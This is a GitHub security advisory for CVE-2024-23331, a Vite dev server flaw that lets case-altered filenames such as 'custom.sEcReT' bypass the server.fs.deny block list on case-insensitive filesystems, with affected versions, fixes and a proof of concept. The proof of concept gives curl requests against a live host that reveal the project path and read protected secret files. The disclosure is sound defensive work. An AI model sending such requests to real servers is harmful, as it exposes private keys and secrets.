# [H] Vite dev server option `server.fs.deny` can be bypassed when hosted on case-insensitive filesystem

## Summary
Severity: High
Advisory: GHSA-c24v-8rfc-w8vw
CVE: CVE-2024-23331
CWE: CWE-178, CWE-200, CWE-284
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N (CVSS_V3)
Published: 2024-01-19
Source: https://github.com/advisories/GHSA-c24v-8rfc-w8vw
Type: github-advisory

## Affected
- npm: `vite` — affected >=2.7.0 <2.9.17
- npm: `vite` — affected >=3.0.0 <3.2.8
- npm: `vite` — affected >=4.0.0 <4.5.2
- npm: `vite` — affected >=5.0.0 <5.0.12

## Details
### Summary
[Vite dev server option](https://vitejs.dev/config/server-options.html#server-fs-deny) `server.fs.deny` can be bypassed on case-insensitive file systems using case-augmented versions of filenames. Notably this affects servers hosted on Windows.

This bypass is similar to https://nvd.nist.gov/vuln/detail/CVE-2023-34092 -- with surface area reduced to hosts having case-insensitive filesystems.

### Patches
Fixed in vite@5.0.12, vite@4.5.2, vite@3.2.8, vite@2.9.17

### Details
Since `picomatch` defaults to case-sensitive glob matching, but the file server doesn't discriminate; a blacklist bypass is possible. 

See `picomatch`  usage, where `nocase` is defaulted to `false`: https://github.com/vitejs/vite/blob/v5.1.0-beta.1/packages/vite/src/node/server/index.ts#L632

By requesting raw filesystem paths using augmented casing, the matcher derived from `config.server.fs.deny` fails to block access to sensitive files. 

### PoC
**Setup**
1. Created vanilla Vite project using `npm create vite@latest` on a Standard Azure hosted Windows 10 instance. 
    - `npm run dev -- --host 0.0.0.0`
    - Publicly accessible for the time being here: http://20.12.242.81:5173/ 
2. Created dummy secret files, e.g. `custom.secret` and `production.pem`
3. Populated `vite.config.js` with
```javascript
export default { server: { fs: { deny: ['.env', '.env.*', '*.{crt,pem}', 'custom.secret'] } } }
```

**Reproduction**
1. `curl -s http://20.12.242.81:5173/@fs//`
    - Descriptive error page reveals absolute filesystem path to project root
2. `curl -s http://20.12.242.81:5173/@fs/C:/Users/darbonzo/Desktop/vite-project/vite.config.js`
    - Discoverable configuration file reveals locations of secrets
3. `curl -s http://20.12.242.81:5173/@fs/C:/Users/darbonzo/Desktop/vite-project/custom.sEcReT`
    - Secrets are directly accessible using case-augmented version of filename

**Proof**
![Screenshot 2024-01-19 022736](https://user-images.githubusercontent.com/907968/298020728-3a8d3c06-fcfd-4009-9182-e842f66a6ea5.png)

### Impact
**Who**
- Users with exposed dev servers on environments with case-insensitive filesystems

**What**
- Files protected by `server.fs.deny` are both discoverable, and accessible

## References
- https://github.com/vitejs/vite/security/advisories/GHSA-c24v-8rfc-w8vw
- https://nvd.nist.gov/vuln/detail/CVE-2023-34092
- https://nvd.nist.gov/vuln/detail/CVE-2024-23331
- https://github.com/vitejs/vite/commit/0cd769c279724cf27934b1270fbdd45d68217691
- https://github.com/vitejs/vite/commit/91641c4da0a011d4c5352e88fc68389d4e1289a5
- https://github.com/vitejs/vite/commit/a26c87d20f9af306b5ce3ff1648be7fa5146c278
- https://github.com/vitejs/vite/commit/eeec23bbc9d476c54a3a6d36e78455867185a7cb
- https://github.com/vitejs/vite
- https://vitejs.dev/config/server-options.html#server-fs-deny
